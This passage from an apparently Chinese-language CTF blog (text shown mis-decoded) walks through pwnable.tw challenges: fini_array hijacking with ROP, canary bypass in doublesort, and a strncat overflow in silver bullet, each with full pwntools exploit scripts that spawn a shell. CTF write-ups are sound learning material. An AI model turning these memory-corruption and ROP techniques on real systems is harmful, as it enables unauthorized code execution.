<h3 id="å¦‚ä½•æ§åˆ¶ç¨‹åºæµ"><a href="#å¦‚ä½•æ§åˆ¶ç¨‹åºæµ" class="headerlink" title="å¦‚ä½•æ§åˆ¶ç¨‹åºæµ"></a>å¦‚ä½•æ§åˆ¶ç¨‹åºæµ</h3><p>åœ¨ç¬¬ä¸€é“é¢˜å°±å·²ç»åˆæ­¥äº†è§£è¿‡ç¨‹åºå¹¶ä¸æ˜¯ç›´æ¥è°ƒç”¨mainå‡½æ•°çš„ï¼Œgccç¼–è¯‘çš„æ—¶å€™ä¼šåœ¨è¿˜ä¼šæ·»åŠ é¢å¤–çš„å‡½æ•°ï¼Œç¼–è¯‘è¿‡åç¨‹åºçš„è°ƒç”¨è¿‡ç¨‹æ˜¯è¿™æ ·çš„ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_start -&gt; __libc_start_main -&gt; __libc_csu_init -&gt;  main -&gt; __libc_csu__fini.</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªç¨‹åºä¹Ÿæ˜¯æŒ‰è¿™ä¸ªæ‰§è¡Œçš„ï¼Œåªä¸è¿‡æ²¡æœ‰ç¬¦å·è¡¨ä¸èƒ½ç«‹é©¬æ‰¾è§å‡½æ•°ï¼Œä¸è¿‡å¯ä»¥é€šè¿‡startçš„è°ƒç”¨å…³ç³»æ‰¾è§ï¼Œæ¼æ´æˆå› åœ¨__libc_csu_initå’Œ__libc_csu__finiä¸Šé¢ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„è™šè¡¨ï¼Œä¸€ä¸ªæ˜¯init_array,ä¸€ä¸ªæ˜¯fini_array,é‡Œé¢å‚¨å­˜äº†å‡½æ•°æŒ‡é’ˆï¼Œè°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°æ—¶å°±ä¼šä»è‡ªå·±çš„è™šè¡¨çš„å–å‡ºå‡½æ•°æŒ‡é’ˆç„¶åè·³åˆ°è¿™æ‰§è¡Œï¼Œè¿™ä¸ªè™šè¡¨æ˜¯å¯ä»¥æ›´æ”¹çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¿™é‡Œæ‹¿åˆ°ç¨‹åºæµäº†ï¼Œä¸¤ä¸ªè™šè¡¨æˆ‘ä»¬èƒ½åˆ©ç”¨çš„æ˜¯fini_array,ä»–å‚¨å­˜ç€ä¸¤ä¸ªåœ°å€ï¼Œ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ini_array:00000000004B40F0 _fini_array     segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.fini_array:00000000004B40F0                 assume cs:_fini_array</span><br><span class="line">.fini_array:00000000004B40F0                 ;org 4B40F0h</span><br><span class="line">.fini_array:00000000004B40F0 byte_4B40F0     db 0                    ; DATA XREF: sub_4028D0+4Câ†‘o</span><br><span class="line">.fini_array:00000000004B40F0                                         ; sub_402960+8â†‘o</span><br><span class="line">.fini_array:00000000004B40F1                 db  1Bh</span><br><span class="line">.fini_array:00000000004B40F2                 db  40h ; @</span><br><span class="line">.fini_array:00000000004B40F3                 db    0</span><br><span class="line">.fini_array:00000000004B40F4                 db    0</span><br><span class="line">.fini_array:00000000004B40F5                 db    0</span><br><span class="line">.fini_array:00000000004B40F6                 db    0</span><br><span class="line">.fini_array:00000000004B40F7                 db    0</span><br><span class="line">.fini_array:00000000004B40F8                 db 80h</span><br><span class="line">.fini_array:00000000004B40F9                 db  15h</span><br><span class="line">.fini_array:00000000004B40FA                 db  40h ; @</span><br><span class="line">.fini_array:00000000004B40FB                 db    0</span><br><span class="line">.fini_array:00000000004B40FC                 db    0</span><br><span class="line">.fini_array:00000000004B40FD                 db    0</span><br><span class="line">.fini_array:00000000004B40FE                 db    0</span><br><span class="line">.fini_array:00000000004B40FF                 db    0</span><br><span class="line">.fini_array:00000000004B40FF _fini_array     ends</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨æ—¶å…ˆè°ƒç”¨fini_array[1],ç„¶åè°ƒç”¨fini_array[0],åªè¦æŠŠfini_array[1]å†™ä¸Šmainå‡½æ•°åœ°å€ï¼Œç„¶åæŠŠfini_array[1]å†™ä¸Š__libc_csu__finiåœ°å€å°±èƒ½å¾ªç¯mainå‡½æ•°ï¼Œè¾¾æˆäº†å¤šæ¬¡ä»»æ„å†™</p>
<p>ç”±äºæˆ‘ä»¬æ‰¾ä¸è§åé—¨å‡½æ•°è€Œä¸”è¿˜æ˜¯é™æ€é“¾æ¥æ— æ³•å¾—åˆ°ogg,æ‰€ä»¥æ²¡åŠæ³•ä¸€æ¬¡æ€§ç›´æ¥getshell,shellcodeä¹Ÿä¸è¡Œï¼Œæ‰€ä»¥åªèƒ½rop,ä½†æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥æ§åˆ¶rsp,ç°åœ¨é—®é¢˜æ›´æ–°äº†ï¼Œè¯¥æ€ä¹ˆæ§åˆ¶rsp,ropåˆæ”¹å†™åˆ°å“ªã€‚</p>
<p>é€šè¿‡æµè§ˆåˆ«çš„wpï¼Œä»–ä»¬ç»“åˆropçš„å˜åŒ–æä¾›äº†ä¸€ä¸ªéå¸¸å·§å¦™çš„æ§åˆ¶ropçš„gadgetï¼Œ_libc_csu_finiçš„ä»£ç å¤§è‡´å¦‚ä¸‹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040297D                 lea     rbp, &amp;fini_array</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]</span><br></pre></td></tr></table></figure>

<p>å…ˆæ˜¯è®©rbxå‚¨å­˜fini_arrayçš„åœ°å€ï¼Œç„¶åé€šè¿‡rbpè°ƒç”¨è™šè¡¨ä¸­çš„å‡½æ•°ï¼Œrbpä¸å†æŒ‡å‘æ ˆå¸§è€Œæ˜¯æŒ‡å‘äº†ä¸€ä¸ªå¯ä»¥å†™çš„åœ°å€ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨rbpï¼ŒæŠŠrbpçš„å€¼èµ‹å€¼ç»™rsp,æˆ‘åœ¨ropperä¸Šé¢æœäº†ï¼Œæ²¡æœ‰å¯ä»¥ç›´æ¥èµ‹å€¼çš„gadget,æˆ‘åœ¨è¿™é‡Œåˆå¡ä½äº†ï¼Œç¿»çœ‹äº†åˆ«äººçš„wpå‘ç°ç«Ÿç„¶æ˜¯ç”¨leave_retè¿›è¡Œèµ‹å€¼ï¼Œå¦™ğŸ‘Œleave_retå…¶å®å¯ä»¥æ‹†åˆ†æˆâ€™mov rsp,rbp;pop rbp,retâ€™,å®Œç¾æŠŠrbpèµ‹å€¼ç»™rsp,å½“æ‰§è¡Œretçš„æ—¶å€™rspæŒ‡å‘äº†fini_array[1],åªè¦è®©fini_array[1]å‚¨å­˜ret,é‚£rspåˆæŒ‡å‘äº†fini_array+0x10,è¿™ä¸ªåœ°å€ä¸å±äºfini_arrayä¸”èƒ½å†™ï¼Œåªè¦å‘è¿™é‡Œå†™å…¥ropå°±å®Œæˆæ”»å‡»äº†ã€‚</p>
<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10105</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x401BC1&#x27;)</span></span><br><span class="line">fini_arrray=<span class="number">0x00000000004B40F0</span></span><br><span class="line">pop_rax=<span class="number">0x000000000041e4af</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401696</span> </span><br><span class="line">pop_rsi=<span class="number">0x0000000000406c30</span></span><br><span class="line">pop_rdx=<span class="number">0x0000000000446e35</span></span><br><span class="line">leavel_ret=<span class="number">0x401C4B</span></span><br><span class="line">rop_addr=<span class="number">0x4B4100</span></span><br><span class="line">main=<span class="number">0x401B6D</span></span><br><span class="line">libc_cus_fini=<span class="number">0x402960</span></span><br><span class="line">binsh_addr=<span class="number">0x4b4000</span></span><br><span class="line">syscall=<span class="number">0x0000000000471db5</span></span><br><span class="line">ret=<span class="number">0x0000000000401016</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_addr</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;addr:&#x27;</span>,timeout=<span class="number">10000</span>)</span><br><span class="line">    sh.send(<span class="built_in">str</span>(addr))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;data:&quot;</span>,timeout=<span class="number">10000</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    write_addr(fini_arrray,p64(libc_cus_fini)+p64(main))</span><br><span class="line">    write_addr(binsh_addr,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    write_addr(rop_addr,p64(pop_rax))</span><br><span class="line">    write_addr(rop_addr+<span class="number">0x8</span>,p64(<span class="number">0x3b</span>))</span><br><span class="line">    write_addr(rop_addr+<span class="number">0x8</span>*<span class="number">2</span>,p64(pop_rdi))</span><br><span class="line">    write_addr(rop_addr+<span class="number">0x8</span>*<span class="number">3</span>,p64(binsh_addr))</span><br><span class="line">    write_addr(rop_addr+<span class="number">0x8</span>*<span class="number">4</span>,p64(pop_rsi))</span><br><span class="line">    write_addr(rop_addr+<span class="number">0x8</span>*<span class="number">5</span>,p64(<span class="number">0</span>))</span><br><span class="line">    write_addr(rop_addr+<span class="number">0x8</span>*<span class="number">6</span>,p64(pop_rdx))</span><br><span class="line">    write_addr(rop_addr+<span class="number">0x8</span>*<span class="number">7</span>,p64(<span class="number">0</span>))</span><br><span class="line">    write_addr(rop_addr+<span class="number">0x8</span>*<span class="number">8</span>,p64(syscall))</span><br><span class="line">    write_addr(fini_arrray,p64(leavel_ret)+p64(ret))</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>å¯æƒœçš„æ˜¯å¯èƒ½æˆ‘çš„vpnä¸æ˜¯å¤ªå¥½ï¼Œè·‘è¿œç¨‹çš„è€æ˜¯ä¸è¡Œã€‚</p>
<h2 id="doublesort"><a href="#doublesort" class="headerlink" title="doublesort"></a>doublesort</h2><p>ä¿æŠ¤</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/rootzhang/get-shell/pwnable.tw/doublesort/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯æ ˆæº¢å‡ºä¸»è¦æ˜¯é¿å…canary,é€šè¿‡è¿™é“é¢˜åˆå­¦äº†ä¸€æ‹›ï¼Œå½“scanfåœ¨ç¼“å­˜åŒºæ‹¿å€¼æ—¶æ£€æµ‹åˆ°æ˜¯éæ³•å­—ç¬¦å¹¶ä¸ä¼šå‚¨å­˜åˆ°å¯¹åº”åœ°å€ï¼Œè€Œæ˜¯ç›´æ¥é€€å‡ºï¼Œæ‰€ä»¥åªè¦æ„é€ éæ³•å­—ç¬¦å°±è·³è¿‡å¯¹canaryçš„è¦†ç›–å°±å¥½äº†ï¼Œä¸è¿‡ä¸æ˜¯ä»»æ„å­—ç¬¦ï¼Œæ¯”å¦‚å½“å‡ºç°â€™aâ€™æ—¶å®ƒæ£€æµ‹åˆ°â€™aâ€™éæ³•äºæ˜¯ç›´æ¥é€€å‡ºï¼Œè¿™æ ·ä¸€æ¥â€™aâ€™è¿˜æ˜¯ç•™åœ¨ç¼“å­˜åŒºäº†ï¼Œä¸‹æ¬¡è¿˜æ˜¯â€™aâ€™,åªæœ‰â€™+â€™æˆ–è€…â€™-â€˜æ—¶æ—¢ä¼šé€€å‡ºåˆæ›´æ–°äº†ç¼“å­˜åŒºã€‚</p>
<p>æœ€åçš„exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">system_offset=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_offfset=libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system_offset)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(binsh_offfset)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x3a819 execve(&quot;/bin/sh&quot;, esp+0x34, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp+0x34] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5f065 execl(&quot;/bin/sh&quot;, eax)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  eax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5f066 execl(&quot;/bin/sh&quot;, [esp])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ogg=[<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b read&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;What your name :&#x27;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1b</span>+<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;aaab&#x27;</span>)</span><br><span class="line">    libc_addr=u32(sh.recv(<span class="number">4</span>))-<span class="number">0x1b1244</span></span><br><span class="line">    system=system_offset+libc_addr</span><br><span class="line">    binsh=binsh_offfset+libc_addr</span><br><span class="line">    elf_addr=u32(sh.recv(<span class="number">4</span>))-<span class="number">0x601</span></span><br><span class="line">    canary=elf_addr+<span class="number">0xb2b</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;How many numbers do you what to sort :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">35</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x18</span>):</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;number : &#x27;</span>)</span><br><span class="line">        sh.sendline(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;number : &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;number : &#x27;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(system))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;number : &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(binsh))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;number : &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(binsh))</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>æˆ‘sbäº†ï¼Œ32ä½ç³»ç»Ÿå‡½æ•°åœ°å€åè·Ÿç€çš„æ˜¯è¿”å›åœ°å€ï¼Œå¹¶ä¸ç›´æ¥æ˜¯å‚æ•°ï¼Œè¿™ä¸ªå¡äº†å¿«ä¸¤ä¸ªå°æ—¶ï¼Œ64ä½çš„é¢˜åšå¤šäº†ã€‚</p>
<h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><p>è¿™é“é¢˜æˆ‘ä¹‹å‰åšè¿‡ï¼Œç¿»æˆ‘åšå®¢åº”è¯¥èƒ½çœ‹è§ï¼Œå°±ä¸åšäº†ã€‚</p>
<h2 id="silver-bullet"><a href="#silver-bullet" class="headerlink" title="silver bullet"></a>silver bullet</h2><p>è¿™é“é¢˜åœ¨æœ€è¿‘ä¸€æ¬¡æ¯”èµ›ä¸­è§è¿‡ï¼Œæ¼æ´å·®ä¸å¤šï¼Œä½†æ”»å‡»ç¨‹åºçš„æ–¹å¼ä¸å¤ªä¸€æ ·ï¼Œä¹‹å‰é‚£é“é¢˜å°±æ˜¯åˆ©ç”¨stncatæ‹·è´å­—èŠ‚åä¼šå†æ·»åŠ ä¸€ä¸ª\x00,è¿™æ ·å°±èƒ½è¶Šç•Œè¦†ç›–äº†ï¼Œç„¶åé‚£é“é¢˜è¿˜ç»™äº†ä¸€ä¸ªlibcåœ°å€å’Œä»»æ„å†™ï¼Œç›´æ¥æ‰“exit_hookäº†ï¼Œè¿™é“é¢˜åªæœ‰strncatï¼Œä½†æ˜¯æ²¡æœ‰canaryä¿æŠ¤ï¼Œæˆ‘ç°åœ¨çš„æ€è·¯å°±æ˜¯ç›´æ¥æ ˆæº¢å‡ºå®Œæˆæ”»å‡»</p>
<p>æˆåŠŸäº†ï¼Œè¿™æ˜¯è„šæœ¬ï¼Œæˆ‘è§‰å¾—è¿™é“é¢˜æ¯”calcè¦ç®€å•å¤šäº†ï¼Œä¸çŸ¥é“ä¸ºå•¥è¿˜æ²¡æœ‰calcåšå‡ºæ¥çš„å¤š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_silver</span>(<span class="params">context</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Give me your description of bullet :&#x27;</span>)</span><br><span class="line">    sh.send(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">power_up</span>(<span class="params">context</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Give me your another description of bullet :&#x27;</span>)</span><br><span class="line">    sh.send(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    gdb.attach(sh,<span class="string">&#x27;b *0x08048A18&#x27;</span>)</span><br><span class="line">    create_silver(<span class="string">&#x27;a&#x27;</span>*<span class="number">47</span>)</span><br><span class="line">    power_up(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;\xff\xff\xff&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(puts_plt)+p32(<span class="number">0x08048954</span>)+p32(puts_got)</span><br><span class="line">    power_up(payload)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Oh ! You win !!\n&#x27;</span>)</span><br><span class="line">    libc_base=u32(sh.recv(<span class="number">4</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    <span class="comment">#print hex(libc_base)</span></span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">    create_silver(<span class="string">&#x27;a&#x27;</span>*<span class="number">47</span>)</span><br><span class="line">    power_up(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;\xff\xff\xff&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system)+p32(<span class="number">0x08048954</span>)+p32(binsh)</span><br><span class="line">    power_up(payload)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="appstore"><a href="#appstore" class="headerlink" title="appstore"></a>appstore</h2><p>çœ‹æ‡‚ç¨‹åºçš„æ•´ä¸ªæµç¨‹çœ‹äº†å¿«ä¸€ä¸ªå°æ—¶å§ï¼Œçœ‹æ‡‚åæ‰¾è§äº†æ¼æ´ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆåˆ©ç”¨ï¼Œåˆå¡äº†å¥½ä¹…ï¼Œæœ€åæƒ³ä¸å‡ºæ¥çœ‹åˆ«çš„wpäº†ã€‚</p>
<p>çœ‹å®Œwpåæ…¢è„‘å­éƒ½æ˜¯ç§’å•ŠğŸ˜ƒğŸ˜ƒï¼Œç«Ÿç„¶æ˜¯åˆ©ç”¨ebpè¿›è¡Œgotå†™ï¼Œæœªæ›¾è®¾æƒ³è¿‡å¾—é“ç†ã€‚</p>
<p>ä¿æŠ¤</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å†™gotè¡¨è¿˜ä¸å¼€pie.</p>
<h3 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">checkout</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2[<span class="number">5</span>]; <span class="comment">// [esp+18h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = cart();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">7174</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;*: iPhone 8 - $1&quot;</span>);</span><br><span class="line">    asprintf(v2, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;iPhone 8&quot;</span>);</span><br><span class="line">    v2[<span class="number">1</span>] = (<span class="keyword">char</span> *)<span class="number">1</span>;</span><br><span class="line">    insert((<span class="keyword">int</span>)v2);</span><br><span class="line">    v1 = <span class="number">7175</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Total: $%d\n&quot;</span>, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Want to checkout? Maybe next time!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

